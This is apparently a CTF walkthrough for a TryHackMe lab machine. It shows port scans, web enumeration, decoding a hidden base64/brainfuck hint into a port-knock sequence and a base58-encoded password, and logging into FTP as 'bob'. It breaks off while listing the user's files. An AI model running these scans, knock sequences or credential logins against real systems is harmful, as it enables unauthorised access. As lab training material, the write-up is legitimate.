----
Successfully hack into bobloblaw's computer
----

![](https://tryhackme-images.s3.amazonaws.com/room-icons/8c7c2c9a239e2badd7a5a62df9eff1d5.png)

### Task 1  Root The Box

 Start Machine

Can you root the box?  

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.209.198 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.209.198:22
Open 10.10.209.198:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 11:04 EDT
Happy 26th Birthday to Nmap, may it live to be 126!
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:04
Completed NSE at 11:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:04
Completed NSE at 11:04, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:04
Completed NSE at 11:04, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:04
Completed Parallel DNS resolution of 1 host. at 11:04, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:04
Scanning 10.10.209.198 [2 ports]
Discovered open port 22/tcp on 10.10.209.198
Discovered open port 80/tcp on 10.10.209.198
Completed Connect Scan at 11:04, 0.21s elapsed (2 total ports)
Initiating Service scan at 11:04
Scanning 2 services on 10.10.209.198
Completed Service scan at 11:04, 6.63s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.209.198.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:04
Completed NSE at 11:04, 6.50s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:04
Completed NSE at 11:04, 0.85s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:04
Completed NSE at 11:04, 0.00s elapsed
Nmap scan report for 10.10.209.198
Host is up, received user-set (0.21s latency).
Scanned at 2023-09-01 11:04:26 EDT for 15s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 e7:28:a6:33:66:4e:99:9e:8e:ad:2f:1b:49:ec:3e:e8 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALXivx0EdFUjWn8Hg9zVrEE0+FIVsz0Dgt27TYzwHsc2NBir/vuOaG2wuM28Yu1yY5yX8QyIT7QvvtGwpZMS9wGy0x+mjSzMVgkkUpMDp2Yholkm9NH/CDhaA8zg3HxGd8/EdnHMLWszgF58xPCjUAtL3tZK09B4w/pdM0FFAF5BAAAAFQDzhIOaKK76v9eKeZNe0ZgkHVdyWQAAAIEAirSNjm02GVhgTbV6I60sZmY9nWORouyVp+Y+K0MQF+Jvxr0QQEWFeIVNbYNW0eg06VJ0JLexGNttrT/N6LPU4KBR7zIGOshLhXV847rwkUjODCt0ZeLjUv0X8o6T4ExZi92VLBylxQmk2OMgUIyeVPVbAsDAK2N0LFWHfpLTbl0AAACARqXryFKMWJQTJ1Ta5dX4bCZ20ulsATRbFuMLH1OZoA7gM2A2rijxPvK6Vp/VJt7701LhgI0dUZClMLC8q0OXaTEO3Ao6zdJb8W5snDue2TrPm12UnELgUD/NwWVqyjgYq1UgZ+71l+3fy6Q8opDILH+RYmAypIXb29dXvICjC5U=
|   2048 86:fc:ed:ce:46:63:4d:fd:ca:74:b6:50:46:ac:33:0f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgOLGhQs3olTn9V7fF/VB8GkElTVbM33EOlppILeLZmIdeg0NkxZdScAjalP4AB/yiU/01Whysy6NhOeuyVfwRhCkvpoWkN1X20YI6fPdTE5TLOeR+m78IXXZlyBSj2GOqvM7tPr0BqvfpsoxkS4zXVYG4OhxZDR4/rmXA9GaSOTzGEOWj839sbW6cdos5nanQSdEhDM441+GeUfXfPh+nqasy422AEhDqFh6cDRcQw5MXR2pt+VicabIfcVjRNRCmNgpx3nbJ/u1TeNC8C40krEiH735AbPd/Bu/Hbg2hY0AR7I/2dwsZMMcQ6weRLY0bOdW8wWPTIgdWN65DVAlf
|   256 e0:cc:05:0a:1b:8f:5e:a8:83:7d:c3:d2:b3:cf:91:ca (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOdOqWQM/+hxmRNa9Np94ZyfIfPGqNPOMKRMQkwCUXxrEfrC6RxnuNQolldjaSZtTx4nd/qWQqcNvrFbifP942o=
|   256 80:e3:45:b2:55:e2:11:31:ef:b1:fe:39:a8:90:65:c5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJCjSR4Gytw2HNoqL4fDTKnxm0d8U/16kopRnicLqWMM
80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:04
Completed NSE at 11:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:04
Completed NSE at 11:04, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:04
Completed NSE at 11:04, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.16 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u http://10.10.209.198 -H "User-Agent: HackerOne VDP wittyale" -i200,301,302,401

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/witty/.dirsearch/reports/10.10.209.198/_23-09-01_11-17-59.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-09-01_11-17-59.log

Target: http://10.10.209.198/

[11:18:00] Starting: 
[11:19:26] 200 -   13KB - /index.html

Task Completed

┌──(witty㉿kali)-[~/Downloads]
└─$ nikto -host http://10.10.209.198 -useragent "User-Agent: HackerOne VDP wittyale"
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.209.198
+ Target Hostname:    10.10.209.198
+ Target Port:        80
+ Start Time:         2023-09-01 11:17:24 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Server may leak inodes via ETags, header found with file /, inode: 3400, size: 5ab85cfdde1d0, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .


Engagement Tools

Using Comments search with burp

K1stLS0+Kys8XT4rLisrK1stPisrKys8XT4uLS0tLisrKysrKysrKy4tWy0+KysrKys8XT4tLisrKytbLT4rKzxdPisuLVstPisrKys8XT4uLS1bLT4rKysrPF0+LS4tWy0+KysrPF0+LS4tLVstLS0+KzxdPi0tLitbLS0tLT4rPF0+KysrLlstPisrKzxdPisuLVstPisrKzxdPi4tWy0tLT4rKzxdPisuLS0uLS0tLS0uWy0+KysrPF0+Li0tLS0tLS0tLS0tLS4rWy0tLS0tPis8XT4uLS1bLS0tPis8XT4uLVstLS0tPis8XT4rKy4rK1stPisrKzxdPi4rKysrKysrKysrKysuLS0tLS0tLS0tLi0tLS0uKysrKysrKysrLi0tLS0tLS0tLS0uLS1bLS0tPis8XT4tLS0uK1stLS0tPis8XT4rKysuWy0+KysrPF0+Ky4rKysrKysrKysrKysrLi0tLS0tLS0tLS0uLVstLS0+KzxdPi0uKysrK1stPisrPF0+Ky4tWy0+KysrKzxdPi4tLVstPisrKys8XT4tLi0tLS0tLS0tLisrKysrKy4tLS0tLS0tLS0uLS0tLS0tLS0uLVstLS0+KzxdPi0uWy0+KysrPF0+Ky4rKysrKysrKysrKy4rKysrKysrKysrKy4tWy0+KysrPF0+LS4rWy0tLT4rPF0+KysrLi0tLS0tLS4rWy0tLS0+KzxdPisrKy4tWy0tLT4rKzxdPisuKysrLisuLS0tLS0tLS0tLS0tLisrKysrKysrLi1bKys+LS0tPF0+Ky4rKysrK1stPisrKzxdPi4tLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+LlstLS0+Kys8XT4tLS4rKysrK1stPisrKzxdPi4tLS0tLS0tLS0uWy0tLT4rPF0+LS0uKysrKytbLT4rKys8XT4uKysrKysrLi0tLS5bLS0+KysrKys8XT4rKysuK1stLS0tLT4rPF0+Ky4tLS0tLS0tLS0uKysrKy4tLS4rLi0tLS0tLS4rKysrKysrKysrKysrLisrKy4rLitbLS0tLT4rPF0+KysrLitbLT4rKys8XT4rLisrKysrKysrKysrLi4rKysuKy4rWysrPi0tLTxdPi4rK1stLS0+Kys8XT4uLlstPisrPF0+Ky5bLS0tPis8XT4rLisrKysrKysrKysrLi1bLT4rKys8XT4tLitbLS0tPis8XT4rKysuLS0tLS0tLitbLS0tLT4rPF0+KysrLi1bLS0tPisrPF0+LS0uKysrKysrKy4rKysrKysuLS0uKysrK1stPisrKzxdPi5bLS0tPis8XT4tLS0tLitbLS0tLT4rPF0+KysrLlstLT4rKys8XT4rLi0tLS0tLi0tLS0tLS0tLS0tLS4tLS1bLT4rKysrPF0+Li0tLS0tLS0tLS0tLS4tLS0uKysrKysrKysrLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+Li0tLS0tLS0uLS0tLS0tLS0tLS0tLi0tLVstPisrKys8XT4uLS0tLS0tLS0tLS0tLi0tLS4rKysrKysrKysuLVstPisrKysrPF0+LS4tLS0tLVstPisrPF0+LS4tLVstLS0+Kys8XT4tLg==

from base64 then brainfck
When I was a kid, my friends and I would always knock on 3 of our neighbors doors. Always houses 1, then 3, then 5!

Dang it Bob, why do you always forget your password?
I'll encode for you here so nobody else can figure out what it is: 
HcfP8J54AK4

https://www.dcode.fr/cipher-identifier

from base58

cUpC4k3s

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh bob@10.10.209.198     
The authenticity of host '10.10.209.198 (10.10.209.198)' can't be established.
ED25519 key fingerprint is SHA256:0XkBHUMyhHjf9e2PYYI/NKQLKJ7jY7Yjr5jt672T5i0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.209.198' (ED25519) to the list of known hosts.
bob@10.10.209.198's password: 
Permission denied, please try again.

┌──(witty㉿kali)-[~/Downloads]
└─$ knock 10.10.209.198 1 3 5                                 
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.209.198 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.209.198:21
Open 10.10.209.198:22
Open 10.10.209.198:80
Open 10.10.209.198:445
Open 10.10.209.198:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 11:40 EDT
Happy 26th Birthday to Nmap, may it live to be 126!
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:40
Completed NSE at 11:40, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:40
Completed NSE at 11:40, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:40
Completed NSE at 11:40, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:40
Completed Parallel DNS resolution of 1 host. at 11:40, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:40
Scanning 10.10.209.198 [5 ports]
Discovered open port 22/tcp on 10.10.209.198
Discovered open port 80/tcp on 10.10.209.198
Discovered open port 445/tcp on 10.10.209.198
Discovered open port 21/tcp on 10.10.209.198
Discovered open port 8080/tcp on 10.10.209.198
Completed Connect Scan at 11:40, 0.18s elapsed (5 total ports)
Initiating Service scan at 11:40
Scanning 5 services on 10.10.209.198
Completed Service scan at 11:40, 16.81s elapsed (5 services on 1 host)
NSE: Script scanning 10.10.209.198.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:40
NSE Timing: About 98.43% done; ETC: 11:41 (0:00:00 remaining)
Completed NSE at 11:41, 40.07s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:41
Completed NSE at 11:41, 1.30s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:41
Completed NSE at 11:41, 0.01s elapsed
Nmap scan report for 10.10.209.198
Host is up, received user-set (0.18s latency).
Scanned at 2023-09-01 11:40:30 EDT for 58s

PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 3.0.2
22/tcp   open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 e7:28:a6:33:66:4e:99:9e:8e:ad:2f:1b:49:ec:3e:e8 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALXivx0EdFUjWn8Hg9zVrEE0+FIVsz0Dgt27TYzwHsc2NBir/vuOaG2wuM28Yu1yY5yX8QyIT7QvvtGwpZMS9wGy0x+mjSzMVgkkUpMDp2Yholkm9NH/CDhaA8zg3HxGd8/EdnHMLWszgF58xPCjUAtL3tZK09B4w/pdM0FFAF5BAAAAFQDzhIOaKK76v9eKeZNe0ZgkHVdyWQAAAIEAirSNjm02GVhgTbV6I60sZmY9nWORouyVp+Y+K0MQF+Jvxr0QQEWFeIVNbYNW0eg06VJ0JLexGNttrT/N6LPU4KBR7zIGOshLhXV847rwkUjODCt0ZeLjUv0X8o6T4ExZi92VLBylxQmk2OMgUIyeVPVbAsDAK2N0LFWHfpLTbl0AAACARqXryFKMWJQTJ1Ta5dX4bCZ20ulsATRbFuMLH1OZoA7gM2A2rijxPvK6Vp/VJt7701LhgI0dUZClMLC8q0OXaTEO3Ao6zdJb8W5snDue2TrPm12UnELgUD/NwWVqyjgYq1UgZ+71l+3fy6Q8opDILH+RYmAypIXb29dXvICjC5U=
|   2048 86:fc:ed:ce:46:63:4d:fd:ca:74:b6:50:46:ac:33:0f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgOLGhQs3olTn9V7fF/VB8GkElTVbM33EOlppILeLZmIdeg0NkxZdScAjalP4AB/yiU/01Whysy6NhOeuyVfwRhCkvpoWkN1X20YI6fPdTE5TLOeR+m78IXXZlyBSj2GOqvM7tPr0BqvfpsoxkS4zXVYG4OhxZDR4/rmXA9GaSOTzGEOWj839sbW6cdos5nanQSdEhDM441+GeUfXfPh+nqasy422AEhDqFh6cDRcQw5MXR2pt+VicabIfcVjRNRCmNgpx3nbJ/u1TeNC8C40krEiH735AbPd/Bu/Hbg2hY0AR7I/2dwsZMMcQ6weRLY0bOdW8wWPTIgdWN65DVAlf
|   256 e0:cc:05:0a:1b:8f:5e:a8:83:7d:c3:d2:b3:cf:91:ca (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOdOqWQM/+hxmRNa9Np94ZyfIfPGqNPOMKRMQkwCUXxrEfrC6RxnuNQolldjaSZtTx4nd/qWQqcNvrFbifP942o=
|   256 80:e3:45:b2:55:e2:11:31:ef:b1:fe:39:a8:90:65:c5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJCjSR4Gytw2HNoqL4fDTKnxm0d8U/16kopRnicLqWMM
80/tcp   open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp  open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    syn-ack Werkzeug httpd 1.0.1 (Python 3.5.3)
|_http-server-header: Werkzeug/1.0.1 Python/3.5.3
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48961/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 37860/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 46570/udp): CLEAN (Timeout)
|   Check 4 (port 35156/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-security-mode: Couldn't establish a SMBv2 connection.

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:41
Completed NSE at 11:41, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:41
Completed NSE at 11:41, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:41
Completed NSE at 11:41, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.05 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ ftp 10.10.209.198                                        
Connected to 10.10.209.198.
220 (vsFTPd 3.0.2)
Name (10.10.209.198:witty): anonymous
530 Permission denied.
ftp: Login failed
ftp> exit
221 Goodbye.
                                                                                   
┌──(witty㉿kali)-[~/Downloads]
└─$ ftp 10.10.209.198
Connected to 10.10.209.198.
220 (vsFTPd 3.0.2)
Name (10.10.209.198:witty): bob
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
229 Entering Extended Passive Mode (|||33995|).
150 Here comes the directory listing.
dr-xr-xr-x    3 1001     1001         4096 Jul 25  2020 .
dr-xr-xr-x    3 1001     1001         4096 Jul 25  2020 ..
-rw-r--r--    1 1001     1001          220 Jul 25  2020 .bash_logout
-rw-r--r--    1 1001     1001         3771 Jul 25  2020 .bashrc
-rw-r--r--    1 1001     1001          675 Jul 25  2020 .profile
-rw-r--r--    1 1001     1001         8980 Jul 25  2020 examples.desktop
dr-xr-xr-x    3 65534    65534        4096 Jul 25  2020 ftp
226 Directory send OK.
ftp> more .bash_logout
# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi


ftp> more .bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	# We have color support; assume it's compliant with Ecma-48
	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	# a case would tend to support setf rather than setaf.)
	color_prompt=yes
    else
	color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[
01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolor
s -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote
=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo er
ror)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi


ftp> more .profile
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
	. "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi


ftp> more examples.desktop
[Desktop Entry]
Version=1.0
Type=Link
Name=Examples
Name[aa]=Ceelallo
Name[ace]=Contoh
Name[af]=Voorbeelde
Name[am]=ምሳሌዎች
Name[an]=Exemplos
Name[ar]=أمثلة
Name[ast]=Exemplos
Name[az]=Nümunələr
Name[be]=Прыклады
Name[bg]=Примери
Name[bn]=উদাহরণ
Name[br]=Skouerioù
Name[bs]=Primjeri
Name[ca]=Exemples
Name[ca@valencia]=Exemples
Name[ckb]=نمونه‌كان
Name[cs]=Ukázky
Name[csb]=Przëmiôrë
Name[cy]=Enghreifftiau
Name[da]=Eksempler
Name[de]=Beispiele
Name[dv]=މިސާލުތަށް
Name[el]=Παραδείγματα
Name[en_AU]=Examples
Name[en_CA]=Examples
Name[en_GB]=Examples
Name[eo]=Ekzemploj
Name[es]=Ejemplos
Name[et]=Näidised
Name[eu]=Adibideak
Name[fa]=نمونه‌ها
Name[fi]=Esimerkkejä
Name[fil]=Mga halimbawa
Name[fo]=Dømir
Name[fr]=Exemples
Name[fur]=Esemplis
Name[fy]=Foarbylden
Name[ga]=Samplaí
Name[gd]=Buill-eisimpleir
Name[gl]=Exemplos
Name[gu]=દૃષ્ટાન્તો
Name[gv]=Sampleyryn
Name[he]=דוגמאות
Name[hi]=उदाहरण
Name[hr]=Primjeri
Name[ht]=Egzanp
Name[hu]=Minták
Name[hy]=Օրինակներ
Name[id]=Contoh
Name[is]=Sýnishorn
Name[it]=Esempi
Name[ja]=サンプル
Name[ka]=ნიმუშები
Name[kk]=Мысалдар
Name[kl]=Assersuutit
Name[km]=ឧទាហរណ៍
Name[kn]=ಉದಾಹರಣೆಗಳು
Name[ko]=예시
Name[ku]=Mînak
Name[kw]=Ensamplow
Name[ky]=Мисалдар
Name[lb]=Beispiller
Name[lt]=Pavyzdžių failai
Name[lv]=Paraugi
Name[mg]=Ohatra
Name[mhr]=Пример-влак
Name[mi]=Tauira
Name[mk]=Примери
Name[ml]=ഉദാഹരണങ്ങള്‍
Name[mr]=उदाहरणे
Name[ms]=Contoh-contoh
Name[my]=ဥပမာများ
Name[nb]=Eksempler
Name[nds]=Bispelen
Name[ne]=उदाहरणहरू
Name[nl]=Voorbeeld-bestanden
Name[nn]=Døme
Name[nso]=Mehlala
Name[oc]=Exemples
Name[pa]=ਉਦਾਹਰਨਾਂ
Name[pl]=Przykłady
Name[pt]=Exemplos
Name[pt_BR]=Exemplos
Name[ro]=Exemple
Name[ru]=Примеры
Name[sc]=Esempiusu
Name[sco]=Examples
Name[sd]=مثالون
Name[se]=Ovdamearkkat
Name[shn]=တူဝ်ယၢင်ႇ
Name[si]=නිදසුන්
Name[sk]=Príklady
Name[sl]=Zgledi
Name[sml]=Saga Saupama
Name[sn]=Miyenzaniso
Name[sq]=Shembujt
Name[sr]=Примери
Name[sv]=Exempel
Name[sw]=Mifano
Name[szl]=Bajszpile
Name[ta]=உதாரணங்கள்
Name[ta_LK]=உதாரணங்கள்
Name[te]=ఉదాహరణలు
Name[tg]=Намунаҳо
Name[th]=ตัวอย่าง
Name[tr]=Örnekler
Name[tt]=Мисаллар
Name[ug]=مىساللار
Name[uk]=Приклади
Name[ur]=مثالیں
Name[uz]=Намуналар
Name[vec]=Esempi
Name[vi]=Mẫu ví dụ
Name[wae]=Bischbil
Name[zh_CN]=示例
Name[zh_HK]=範例
Name[zh_TW]=範例
Comment=Example content for Ubuntu
Comment[aa]=Ubuntuh addattinoh ceelallo
Comment[ace]=Contoh aso ke Ubuntu
Comment[af]=Voorbeeld inhoud vir Ubuntu
Comment[am]=ዝርዝር ምሳሌዎች ለ ኡቡንቱ
Comment[an]=Conteniu d'exemplo ta Ubuntu
Comment[ar]=أمثلة محتوى لأوبونتو
Comment[ast]=Conteníu del exemplu pa Ubuntu
Comment[az]=Ubuntu üçün nümunə material
Comment[be]=Узоры дакументаў для Ubuntu
Comment[bg]=Примерно съдържание за Ubuntu
Comment[bn]=উবুন্টু সংক্রান্ত নমুনা তথ্য
Comment[br]=Skouerenn endalc'had evit Ubuntu
Comment[bs]=Primjer sadrzaja za Ubuntu
Comment[ca]=Continguts d'exemple per a l'Ubuntu
Comment[ca@valencia]=Continguts d'exemple per a l'Ubuntu
Comment[ckb]=نموونەی ناوەڕۆکێک بۆ ئوبوونتو
Comment[cs]=Ukázkový obsah pro Ubuntu
Comment[csb]=Przëmiôrowô zamkłosc dlô Ubuntu
